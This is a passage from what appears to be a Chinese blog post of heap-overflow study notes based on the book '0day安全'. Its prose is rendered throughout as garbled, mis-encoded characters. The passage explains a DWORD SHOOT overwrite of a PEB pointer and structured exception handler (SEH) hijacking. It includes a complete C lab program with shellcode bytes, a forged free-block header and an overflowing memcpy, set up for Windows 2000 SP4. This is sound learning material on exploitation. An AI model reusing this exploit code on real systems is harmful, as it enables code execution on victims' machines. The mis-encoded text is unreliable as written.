3‰∏≠Êñ≠ÂêéËøõÂÖ•OllyDBGËøõË°åË∞ÉËØïÔºåÊúÄÁªàÁ®ãÂ∫è‰ºöÁªàÊ≠¢Âú®ntdllÁöÑÂÜÖÊ†∏‰ª£Á†Å‰∏≠Ôºå‰∏ç‰ºöÊàêÂäüÂºπÁ™óÔºå‰πü‰∏ç‰ºöÊâßË°åÂà∞Êàë‰ª¨ÁöÑshellcodeÔºåÊàëÂ∞ùËØï‰∫ÜÂæàÂ§ö‰øÆÊîπÈÄâÈ°πÊàñËÄÖ‰∏çÂêåÊñ≠ÁÇπÁöÑÊñπÂºèÈÉΩÊó†Ê≥ïËß£ÂÜ≥Ëøô‰∏™ÈóÆÈ¢òÔºåÁî±‰∫éÂÆÉ‰∏çÂΩ±ÂìçÊàë‰ª¨ÂØπÂà©Áî®P.E.BËøõË°åÂ†ÜÊ∫¢Âá∫Âà©Áî®ÁöÑÁêÜËß£ÔºåÂõ†Ê≠§ÊîæÂú®ÂêéÈù¢ËÆ®ËÆ∫„ÄÇ</p><h5 id="ÂÖ≥‰∫éÂÖ∂‰∏≠ÁªÜËäÇÁöÑÊÄùËÄÉ">3) ÂÖ≥‰∫éÂÖ∂‰∏≠ÁªÜËäÇÁöÑÊÄùËÄÉ</h5><p>ËôΩÁÑ∂Êó†Ê≥ïË∑üË∏™Ë∞ÉËØïÂ†ÜÊ∫¢Âá∫ÁöÑËøáÁ®ãÔºå‰ΩÜÊòØÊàë‰ª¨ÂèØ‰ª•ËßÇÂØü‰∏Ä‰∏ãÂ†ÜÊ∫¢Âá∫‰πãÂâçÁöÑÂ†ÜÂÜÖÂ≠òÁöÑÂàÜÂ∏ÉÔºåÂΩì‰ª£Á†ÅÊâßË°åÂà∞106Ë°åmemcpy()Ë∞ÉÁî®‰πãÂâçÊó∂ÔºåËßÇÂØüÁ©∫Ë°®Á¥¢ÂºïÂå∫ÔºåÂ¶Ç‰∏ãÂõæÔºö</p><img src="/tech/heap-overflow-learning-notes-2/2_2_1_1.png" class="" title="Âõæ2.2.1.1"><p>ËßÇÂØüÂ†ÜÊï∞ÊçÆÂå∫Ôºö</p><img src="/tech/heap-overflow-learning-notes-2/2_2_1_2.png" class="" title="Âõæ2.2.1.2"><p>ÂèØ‰ª•ÁúãÂà∞Â∞æÂùóÁöÑÂâçÂêéÂêëÊåáÈíàÂùáÊåáÂêë0x178Â§ÑÁöÑFreelist[0]„ÄÇ</p><p>Êé•ÁùÄÊâßË°å‰ª£Á†ÅÂà∞ÂÆåÊàê106Ë°åÁöÑmemcpyÊìç‰ΩúÔºåÂÜçËßÇÂØüÂØπÊï∞ÊçÆÂå∫Ôºö</p><img src="/tech/heap-overflow-learning-notes-2/2_2_1_3.png" class="" title="Âõæ2.2.1.3"><p>Áî±‰∫éh1Â§ÑÂèëÁîüÊ∫¢Âá∫Ôºå0x688Â§ÑÂÜôÂÖ•ÁöÑshellcode‰ºöË∂äÁïåË¶ÜÁõñÂà∞0x758Â§ÑÁöÑÂ∞æÂùóÁöÑÂâçÂêéÂêëÊåáÈíàÔºåÂâçÂêëÊåáÈíàflinkË¢´‰øÆÊîπ‰∏∫0x00360688ÔºåÂêéÂêëÊåáÈíàblinkË¢´‰øÆÊîπ‰∏∫0x7FFDF020„ÄÇÁî±‰∫éÂΩìÂâçÂ∞æÂùó‰∏éFreelist[0]Áõ∏‰∫í‰∏≤Êé•ÔºåËÄåh2‰ºöÁî≥ËØ∑(1+1) x 8 ByteÁöÑÁ©∫Èó¥ÔºåÂΩìÂâçFreelist[2]‰∏≠Ê≤°ÊúâÁ©∫Èó≤ÂùóÔºåÂõ†Ê≠§‰ºö‰ªéÂ∞æÂùó‰∏≠‚ÄùÂàÜÂâ≤‚ÄúÊâÄÈúÄÁ©∫Èó¥Áªôh2ÔºåËøôÈúÄË¶ÅÂ∞ÜÂΩìÂâçÂ∞æÂùó‰ªéFreelist[0]‰∏≠‚ÄùÂç∏‰∏ã‚ÄúÔºåËÄåÂâçÈù¢ÁöÑÂ†ÜÊ∫¢Âá∫Âà©Áî®ÂéüÁêÜ‰∏≠‰ªãÁªçËøáÔºåÂ∞Ü‰∏Ä‰∏™ÁªìÁÇπ‰ªéÂèåÂêëÈìæË°®‰∏≠‚ÄúÂç∏‰∏ã‚ÄùÁöÑÂáΩÊï∞ÂæàÂèØËÉΩÊòØÁ±ª‰ººËøôÊ†∑ÁöÑÔºö</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">remove</span> <span class="params">(ListNode * node)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">node -&gt; <span class="built_in">blink</span> -&gt; flink = node -&gt; flink;</span><br><span class="line">node -&gt; flink -&gt; <span class="built_in">blink</span> = node -&gt; <span class="built_in">blink</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ÂÖ∂‰∏≠ÔºånodeÂèØÁêÜËß£Âç≥‰∏∫ËØ•ËäÇÁÇπÊï∞ÊçÆÂå∫ÔºàËÄåÈùûÂùóÈ¶ñÔºâÁöÑÂú∞ÂùÄÔºåÊú¨‰æã‰∏≠ÂèØÂ¶Ç‰∏ãÁêÜËß£Ôºö</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">DWORD ** node = <span class="number">0x00360758</span>; <span class="comment">//nodeÊåáÂêëÂ∞æÂùóÊï∞ÊçÆÂå∫</span></span><br><span class="line"></span><br><span class="line">nodeÂÄº‰∏∫<span class="number">0x00360758</span>„ÄÇ</span><br><span class="line">*nodeÂÄº‰∏∫<span class="number">0x00360688</span>ÔºåÊòØË¢´Ë¶ÜÁõñÂêéÁöÑÂâçÂêëÊåáÈíàflink„ÄÇ</span><br><span class="line">*(node+<span class="number">4</span>)ÂÄº‰∏∫<span class="number">0x7FFDF020</span>ÔºåÊòØË¢´Ë¶ÜÁõñÂêéÁöÑÂêéÂêëÊåáÈíà<span class="built_in">blink</span>„ÄÇ</span><br></pre></td></tr></table></figure><p>ÂàôÂ¶Ç‰∏ãÊìç‰ΩúÂ∞±ÂèØ‰ª•ËøôÊ†∑ÁêÜËß£:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">node -&gt; flink Á≠â‰ª∑‰∫é *(node+<span class="number">0</span>)ÔºåÂç≥*node</span><br><span class="line">node -&gt; <span class="built_in">blink</span> Á≠â‰ª∑‰∫é *(node+<span class="number">4</span>)</span><br></pre></td></tr></table></figure><p>Âõ†Ê≠§Ôºå‰∏äÈù¢ÁöÑ‰ª£Á†ÅÂèØ‰ª•ÁêÜËß£‰∏∫</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">remove</span> <span class="params">(ListNode * node)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">*(*(node+<span class="number">4</span>)) = *node;</span><br><span class="line">*(*node+<span class="number">4</span>) = *(node+<span class="number">4</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Âõ†Ê≠§Êú¨‰æãÂèØÊúÄÁªàÁêÜËß£‰∏∫ËøõË°å‰∫ÜÂ¶Ç‰∏ãÊìç‰Ωú</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Memory(<span class="number">0x7FFDF020</span>) = <span class="number">0x00360688</span>; <span class="comment">//P.E.B DWORD SHOOT</span></span><br><span class="line">Memory(<span class="number">0x0036068C</span>) = <span class="number">0x7FFDF020</span>; <span class="comment">//ÊåáÈíàÂèçÂ∞Ñ</span></span><br></pre></td></tr></table></figure><p>Â¶Ç‰∏ä‰ª£Á†Å‰∏≠Á¨¨‰∏ÄË°åÂêëÂÜÖÂ≠òÂú∞ÂùÄ0x7FFDF020ÂÜôÂÖ•‰∫ÜDWORDÂÄº0x00360688ÔºåÁØ°Êîπ‰∫ÜËØ•Â§ÑÂéüÊù•Â≠òÂÇ®ÁöÑÊåáÂêë‰∏¥ÁïåÂå∫ÂáΩÊï∞RtlEnterCriticalSection()ÁöÑÊåáÈíàÔºåÂõ†Ê≠§Âú®Á®ãÂ∫èÂá∫ÈîôÈÄÄÂá∫Ë∞ÉÁî®ExitProcess()Êó∂ÔºåÂ∞±‰ºöÈúÄË¶ÅÂà∞P.E.B‰æøÂÆú0x20Â§ÑËé∑ÂæóÊåáÂêëRtlEnterCriticalSection()ÂáΩÊï∞ÁöÑÊåáÈíàÔºåÁªìÊûúËé∑ÂæóÁöÑÊòØshellcodeÁöÑÂú∞ÂùÄ0x00360688ÔºåÂõ†Ê≠§ËΩ¨ËÄåÂéªÊâßË°åshellcode„ÄÇ</p><p>‰ΩÜËßÇÂØüÁ¨¨‰∫åË°å‰ª£Á†ÅÔºå‰ª£Á†Å‰ºöÂêëshellcodeÂâçÈÉ®Á¨¨5 ByteÂ§ÑÂÜôÂÖ•DWORD ÂÄº0x7FFDF020ÔºåÂõ†Ê≠§‰Ωç‰∫éshellcode‰∏≠ÁöÑ2007F‰ºöË¢´ÂΩìÂÅöÊú∫Âô®Á†ÅÊâßË°åÔºåËøôÊúâÂèØËÉΩÂΩ±ÂìçshellcodeÁöÑÊ≠£Á°ÆÊâßË°åÔºåËøôÁßçÁé∞Ë±°Âè´ÂÅö_<strong>ÊåáÈíàÂèçÂ∞Ñ</strong>_ÔºåÂ•ΩÂú®Êú¨‰æã‰∏≠Ëøô‰∫õÊåá‰ª§Êó†ÂÖ≥ÁóõÁóí‚ÄúÔºåÂπ∂Ê≤°ÊúâÂΩ±ÂìçshellcodeÂÖ≥ÈîÆ‰ª£Á†ÅÁöÑÊâßË°å„ÄÇ</p><blockquote><p>‰ΩÜÂ¶ÇÊûúÂú®‰∏∫Êüê‰∏™ÁâπÂÆöÊºèÊ¥ûÂºÄÂèëexploitÊó∂ÔºåÊåáÈíàÂèçÂ∞ÑÂèëÁîü‰∏îÁõÆÊ†áÊåáÈíà‰∏çËÉΩÂΩìÂÅö‚ÄùÊó†ÂÖ≥ÁóõÁóí‚ÄúÁöÑÊåá‰ª§ÂÆâÂÖ®Âú∞ÊâßË°åËøáÂéªÔºåÈÇ£Â∞±ÂæóÂºÄÂä®ËÑëÁ≠ã‰ΩøÁî®Âà´ÁöÑÁõÆÊ†áÔºåÊàñËÄÖ‰ΩøÁî®Ë∑≥ÊùøÊäÄÊúØ„ÄÇËøô‰πüÊòØÊàë‰ªãÁªç‰∫ÜÂæàÂ§öÁßçÂà©Áî®ÊÄùË∑ØÁªôÂ§ßÂÆ∂ÁöÑÂéüÂõ†‚Äî‚ÄîË¶Å‰∏çÁÑ∂Â∞±Âè™ÊúâËá™ËÆ§ÂÄíÈúâ‰∫Ü„ÄÇ</p><footer><strong>ÁéãÊ∏Ö</strong><cite>„Ää0dayÂÆâÂÖ®ÔºöËΩØ‰ª∂ÊºèÊ¥ûÂàÜÊûêÊäÄÊúØ„Äã(Á¨¨‰∫åÁâà) -> P177</cite></footer></blockquote><h4 id="ÈÄöËøás.e.hÂºÇÂ∏∏Â§ÑÁêÜÁªìÊûÑ‰ΩìÂÆûÊñΩÊîªÂáª">(2) ÈÄöËøáS.E.HÔºàÂºÇÂ∏∏Â§ÑÁêÜÁªìÊûÑ‰ΩìÔºâÂÆûÊñΩÊîªÂáª</h4><h5 id="s.e.hÂà©Áî®ÂéüÁêÜ">1) S.E.HÂà©Áî®ÂéüÁêÜ</h5><blockquote><p>Êìç‰ΩúÁ≥ªÁªüÊàñÁ®ãÂ∫èËøêË°åÊó∂ÔºåÈöæÂÖç‰ºöÈÅáÂà∞ÂêÑÁßçÂêÑÊ†∑ÁöÑÈîôËØØÔºå‰∏∫‰∫Ü‰øùËØÅÁ≥ªÁªüÂú®ÈÅáÂà∞ÈîôËØØÊó∂‰∏çËá≥‰∫éÂ¥©Ê∫É‰∫ÜÔºå‰ªçËÉΩÂ§üÂÅ•Â£ÆÁ®≥ÂÆöÂú∞ÁªßÁª≠ËøêË°å‰∏ãÂéªÔºåWindows‰ºöÂØπËøêË°åÂú®ÂÖ∂‰∏≠ÁöÑÁ®ãÂ∫èÊèê‰æõ‰∏ÄÊ¨°Ë°•ÊïëÁöÑÊú∫‰ºöÊù•Â§ÑÁêÜÈîôËØØÔºåËøôÁßçÊú∫Âà∂Â∞±ÊòØÂºÇÂ∏∏Â§ÑÁêÜÊú∫Âà∂„ÄÇ</p><p>S.E.HÂç≥ÂºÇÂ∏∏Â§ÑÁêÜÁªìÊûÑ‰ΩìÔºàStructure Exception HandlerÔºâÔºåÂÆÉÊòØWindowsÂºÇÂ∏∏Â§ÑÁêÜÊú∫Âà∂ÊâÄÈááÁî®ÁöÑÈáçË¶ÅÊï∞ÊçÆÁªìÊûÑ„ÄÇÊØè‰∏™S.E.HÂåÖÂê´‰∏§‰∏™DWORDÊåáÈíàÔºöS.E.HÈìæË°®ÊåáÈíàÂíåÂºÇÂ∏∏Â§ÑÁêÜÂáΩÊï∞Âè•ÊüÑÔºåÂÖ±8‰∏™Â≠óËäÇÔºåÂ¶ÇÂõæ6.1.1ÊâÄÁ§∫„ÄÇ</p><p><img src="/tech/heap-overflow-learning-notes-2/0day_6_1_1.png" class="" title="„Ää0dayÂÆâÂÖ®ÔºöËΩØ‰ª∂ÊºèÊ¥ûÂàÜÊûêÊäÄÊúØ„Äã(Á¨¨‰∫åÁâà) -&gt; P178 -&gt; Âõæ6.1.1"></p><p>‰Ωú‰∏∫ÂØπS.E.HÁöÑÂàùÊ≠•‰∫ÜËß£ÔºåÊàë‰ª¨Áé∞Âú®Âè™ÈúÄË¶ÅÁü•ÈÅì‰∏Ä‰∏ãÂá†‰∏™Ë¶ÅÁÇπÔºåS.E.HÈìæË°®Â¶ÇÂõæ6.1.2ÊâÄÁ§∫„ÄÇ</p><ol type="1"><li>S.E.HÁªìÊûÑ‰ΩìÂ≠òÊîæÂú®Á≥ªÁªüÊ†à‰∏≠„ÄÇ</li><li>ÂΩìÁ∫øÁ®ãÂàùÂßãÂåñÊó∂Ôºå‰ºöËá™Âä®ÂêëÊ†à‰∏≠ÂÆâË£Ö‰∏Ä‰∏™S.E.HÔºå‰Ωú‰∏∫Á∫øÁ®ãÈªòËÆ§ÁöÑ‰∏ÄÂú∫Â§ÑÁêÜ„ÄÇ</li><li>Â¶ÇÊûúÁ®ãÂ∫èÊ∫ê‰ª£Á†Å‰∏≠‰ΩøÁî®‰∫Ü__try{}__except{}ÊàñËÄÖAssertÂÆèÁ≠âÂºÇÂ∏∏Â§ÑÁêÜÊú∫Âà∂ÔºåÁºñËØëÂô®Â∞ÜÊúÄÁªàÈÄöËøáÂêëÂΩìÂâçÂáΩÊï∞Ê†àÂ∏ß‰∏≠ÂÆâË£Ö‰∏Ä‰∏™S.E.HÊù•ÂÆûÁé∞ÂºÇÂ∏∏Â§ÑÁêÜ„ÄÇ</li><li>Ê†à‰∏≠‰∏ÄËà¨‰ºöÂêåÊó∂Â≠òÂú®Â§ö‰∏™S.E.H</li><li>Ê†à‰∏≠ÁöÑÂ§ö‰∏™S.E.HÈÄöËøáÈìæË°®ÊåáÈíàÂú®Ê†àÂÜÖÁî±Ê†àÈ°∂ÂêëÊ†àÂ∫ï‰∏≤ÊàêÂçïÂêëÈìæË°®Ôºå‰Ωç‰∫éÈìæË°®ÊúÄÈ°∂Á´ØÁöÑS.E.HÈÄöËøáT.E.BÔºàÁ∫øÁ®ãÁéØÂ¢ÉÂùóÔºâ0Â≠óËäÇÂÅèÁßªÂ§ÑÁöÑÊåáÈíàÊ†áËØÜ„ÄÇ</li><li>ÂΩìÂºÇÂ∏∏ÂèëÁîüÊó∂ÔºåÊìç‰ΩúÁ≥ªÁªü‰ºö‰∏≠Êñ≠Á®ãÂ∫èÔºåÂπ∂È¶ñÂÖà‰ªéT.E.BÁöÑ0Â≠óËäÇÂÅèÁßªÂ§ÑÂèñÂá∫Ë∑ùÁ¶ªÊ†àÈ°∂ÊúÄËøëÁöÑS.E.HÔºå‰ΩøÁî®ÂºÇÂ∏∏Â§ÑÁêÜÂáΩÊï∞Âè•ÊüÑÊâÄÊåáÂêëÁöÑ‰ª£Á†ÅÊù•Â§ÑÁêÜÂºÇÂ∏∏„ÄÇ</li><li>ÂΩìÁ¶ª‚Äù‰∫ãÊïÖÁé∞Âú∫‚ÄúÊúÄËøëÁöÑÂºÇÂ∏∏Â§ÑÁêÜÂáΩÊï∞ËøêË°åÂ§±Ë¥•Êó∂ÔºåÂ∞ÜÈ°∫ÁùÄS.E.HÈìæË°®‰æùÊ¨°Â∞ùËØïÂÖ∂‰ªñÁöÑÂºÇÂ∏∏Â§ÑÁêÜÂáΩÊï∞„ÄÇ</li><li>Â¶ÇÊûúÁ®ãÂ∫èÂÆâË£ÖÁöÑÊâÄÊúâÂºÇÂ∏∏Â§ÑÁêÜÂáΩÊï∞ÈÉΩ‰∏çËÉΩÂ§ÑÁêÜÔºåÁ≥ªÁªüÂ∞ÜÈááÁî®ÈªòËÆ§ÁöÑÂºÇÂ∏∏Â§ÑÁêÜÂáΩÊï∞„ÄÇÈÄöÂ∏∏ÔºåËøô‰∏™ÂáΩÊï∞‰ºöÂºπÂá∫‰∏Ä‰∏™ÈîôËØØÂØπËØùÊ°ÜÔºåÁÑ∂ÂêéÂº∫Âà∂ÂÖ≥Èó≠Á®ãÂ∫è„ÄÇ</li></ol><footer><strong>ÁéãÊ∏Ö</strong><cite>„Ää0dayÂÆâÂÖ®ÔºöËΩØ‰ª∂ÊºèÊ¥ûÂàÜÊûêÊäÄÊúØ„Äã(Á¨¨‰∫åÁâà) -> P178-179</cite></footer></blockquote><img src="/tech/heap-overflow-learning-notes-2/0day_6_1_2.png" class="" title="„Ää0dayÂÆâÂÖ®ÔºöËΩØ‰ª∂ÊºèÊ¥ûÂàÜÊûêÊäÄÊúØ„Äã(Á¨¨‰∫åÁâà) -&gt; P179 -&gt; Âõæ6.1.2"><blockquote><p>‰ªéÁ®ãÂ∫èËÆæËÆ°ËßíÂ∫¶Êù•ËÆ≤ ÔºåS.E.HÂ∞±ÊòØÂú®Á≥ªÁªüÂÖ≥Èó≠Á®ãÂ∫è‰πãÂâçÔºåÁªôÁ®ãÂ∫è‰∏Ä‰∏™È¢ÑÂÖàÊâßË°åËÆæÂÆöÁöÑÂõûË∞ÉÂáΩÊï∞Ôºàcall backÔºâÁöÑÊú∫‰ºö„ÄÇÂ§ßÊ¶ÇÊòéÁôΩ‰∫ÜS.E.HÁöÑÂ∑•‰ΩúÂéüÁêÜ‰πãÂêé ÔºåËÅ™ÊòéÁöÑËØªËÄÖÊúãÂèã‰ª¨ÂèØËÉΩÂ∑≤ÁªèÂèëÁé∞‰∫ÜÈóÆÈ¢òÊâÄÂú®„ÄÇ (1) S.E.HÂ≠òÊîæÂú®Ê†à‰∏≠ÔºåÊïÖÊ∫¢Âá∫ÁºìÂÜ≤Âå∫ÁöÑÊï∞ÊçÆÊúâÂèØËÉΩÊ∑πÊ≤°S.E.H„ÄÇ (2) Á≤æÂøÉÂà∂ÈÄ†ÁöÑÊ∫¢Âá∫Êï∞ÊçÆÂèØ‰ª•ÊääS.E.H‰∏≠ÂºÇÂ∏∏Â§ÑÁêÜÂáΩÊï∞ÁöÑÂÖ•Âè£Âú∞ÂùÄÊõ¥Êîπ‰∏∫shellcodeÁöÑËµ∑ÂßãÂú∞ÂùÄ„ÄÇ (3) Ê∫¢Âá∫ÂêéÈîôËØØÁöÑÊ†àÂ∏ßÊàñÂ†ÜÂùóÊï∞ÊçÆÂæÄÂæÄ‰ºöËß¶ÂèëÂºÇÂ∏∏„ÄÇ (4) ÂΩìWindowsÂºÄÂßãÂ§ÑÁêÜÊ∫¢Âá∫ÂêéÁöÑÂºÇÂ∏∏Êó∂Ôºå‰ºöÈîôËØØÂú∞ÊääshellcodeÂΩì‰ΩúÂºÇÂ∏∏Â§ÑÁêÜÂáΩÊï∞ËÄåÊâßË°å„ÄÇ</p><footer><strong>ÁéãÊ∏Ö</strong><cite>„Ää0dayÂÆâÂÖ®ÔºöËΩØ‰ª∂ÊºèÊ¥ûÂàÜÊûêÊäÄÊúØ„Äã(Á¨¨‰∫åÁâà) -> P178-179</cite></footer></blockquote><h5 id="ÂÆûÈ™å-1">2) ÂÆûÈ™å</h5><p>Êú¨ÂÆûÈ™åÈÄöËøáÊ∑πÊ≤°Â∞æÂùóÂùóÈ¶ñÔºåÊù•Ëß¶ÂèëDWORD SHOOT‰ª•‰øÆÊîπS.E.H‰∏≠Á¨¨‰∏Ä‰∏™ÂºÇÂ∏∏Â§ÑÁêÜÂáΩÊï∞ÁöÑÂú∞ÂùÄÔºåÂØºËá¥Â†ÜÊ∫¢Âá∫‰∫ßÁîüÈîôËØØÈúÄÊâßË°åÂºÇÂ∏∏Â§ÑÁêÜÂáΩÊï∞Êó∂ÂÆûÈôÖÂç¥ÊâßË°å‰∫Üshellcode„ÄÇ</p><p>Êú¨ÂÆûÈ™å‰ª£Á†Å‰∏éÁ¨¨‰∫îÁ´†‰∏≠‰ª£Á†ÅÁ±ª‰ººÔºåÂõ†Ê≠§‰ΩúËÄÖÊ≤°ÊúâÂú®Èöè‰π¶‰ª£Á†Å‰∏≠ÁªôÂá∫Ôºå‰∏ãÈù¢ÁªôÂá∫ÊàëËá™Â∑±‰øÆÊîπÁöÑÁâàÊú¨Ôºö</p><figure class="highlight c"><figcaption><span>„Ää0dayÂÆâÂÖ®ÔºöËΩØ‰ª∂ÊºèÊ¥ûÂàÜÊûêÊäÄÊúØ„Äã(Á¨¨‰∫åÁâà) -> P184</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="keyword">char</span> shellcode[]=</span><br><span class="line"><span class="string">"\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="string">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="string">"\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"</span></span><br><span class="line"><span class="string">"\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"</span></span><br><span class="line"><span class="string">"\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"</span></span><br><span class="line"><span class="string">"\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"</span></span><br><span class="line"><span class="string">"\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"</span></span><br><span class="line"><span class="string">"\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"</span></span><br><span class="line"><span class="string">"\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"</span></span><br><span class="line"><span class="string">"\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"</span></span><br><span class="line"><span class="string">"\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"</span></span><br><span class="line"><span class="string">"\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50"</span></span><br><span class="line"><span class="string">"\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="string">"\x16\x01\x1A\x00\x00\x10\x00\x00"</span><span class="comment">// head of the ajacent free block</span></span><br><span class="line"><span class="string">"\x88\x06\x36\x00"</span></span><br><span class="line"><span class="string">"\x90\x90\x90\x90"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function">DWORD <span class="title">MyExceptionHandler</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">ExitProcess(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line">HLOCAL h1 = <span class="number">0</span>, h2 = <span class="number">0</span>;</span><br><span class="line">HANDLE hp;</span><br><span class="line"></span><br><span class="line">hp = HeapCreate(<span class="number">0</span>,<span class="number">0x1000</span>,<span class="number">0x10000</span>);</span><br><span class="line">h1 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">200</span>);</span><br><span class="line"><span class="built_in">memcpy</span>(h1,shellcode,<span class="number">0x200</span>); <span class="comment">//overflow, 0x200=512</span></span><br><span class="line"></span><br><span class="line">__asm <span class="keyword">int</span> <span class="number">3</span></span><br><span class="line">__try&#123;</span><br><span class="line">h2 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">8</span>);</span><br><span class="line">&#125;</span><br><span class="line">__except(MyExceptionHandler())&#123;&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ÁºñËØëÁéØÂ¢ÉÂ¶Ç‰∏ãÔºö</p><ul><li>Êìç‰ΩúÁ≥ªÁªüÔºöËøêË°å‰∫éVmwareËôöÊãüÊú∫ÔºåÁâàÊú¨Win 2K SP4 5.00.2195 EN</li><li>ÁºñËØëÂô®ÔºöVisual C++ 6.0</li><li>ÁºñËØëÈÄâÈ°πÔºöÈªòËÆ§ÈÄâÈ°π</li><li>buildÁâàÊú¨ÔºöreleaseÁâà</li></ul><p>ÂèØ‰ª•ËßÇÂØüÂà∞ÔºåÊú¨‰æã‰∏≠shellcode‰∏é‰∏ä‰æã‰∏≠Âü∫Êú¨‰∏ÄËá¥Ôºå‰∏çÂêå‰πãÂ§ÑÊúâ‰∫åÔºö</p><ul><li>DWORD SHOOTÁöÑÁõÆÊ†áÂú∞ÂùÄÔºåÂç≥shellcodeÁöÑÊúÄÂêé4 ByteÔºåÊú¨‰æã‰∏≠ÊöÇ‰∏∫90909090Ôºå‰∏∫ÂºÇÂ∏∏Â§ÑÁêÜÂáΩÊï∞Âú∞ÂùÄÔºåÂú®ËøõË°å‰∏ÄÊ¨°Ë∞ÉËØïÁ°ÆÂÆöÂêéÔºåÂÜçÊõøÊç¢Âç≥ÂèØ</li><li>Êú¨‰æã‰∏≠Ê≤°ÊúâËøõË°å‰∏ä‰æã‰∏≠ÂØπ0x7FFDF020Â§Ñ‰∏¥ÁïåÂå∫ÂáΩÊï∞RtlEnterCriticalSection()ÊåáÈíàÁöÑ‰øÆÂ§çÔºåÂõ†‰∏∫Êú¨‰æã‰∏≠Âπ∂Ê≤°ÊúâÊîπÂèòÂÆÉ„ÄÇ</li></ul><p>Âú®ÁºñËØëÂêéÊâßË°åÁ®ãÂ∫è‰πãÂâçÔºåÂÖàÊîπÂèòOllyDBGËÆæÁΩÆÔºå‰∏çÂøΩÁï•‰ªª‰ΩïÂºÇÂ∏∏ÔºåÂ¶Ç‰∏ãÂõæ:</p><img src="/tech/heap-overflow-learning-notes-2/2_2_2_1.png" class="" title="Âõæ2.2.2.1"><p>Êé•ÁùÄÊâßË°åÁ®ãÂ∫èÔºåÂú®INT3Â§Ñ‰∏≠Êñ≠ÔºåËßÇÂØüÊ≠§Êó∂Ê†à‰∏≠ÁöÑS.E.H chainÔºåViewËèúÂçï -&gt; SEH chainÔºåÂ¶Ç‰∏ãÂõæÔºö</p><img src="/tech/heap-overflow-learning-notes-2/2_2_2_2.png" class="" title="Âõæ2.2.2.2"><p>‰ΩÜÊòØÔºåËøôÊó∂ÁúãÂà∞ÁöÑSEH 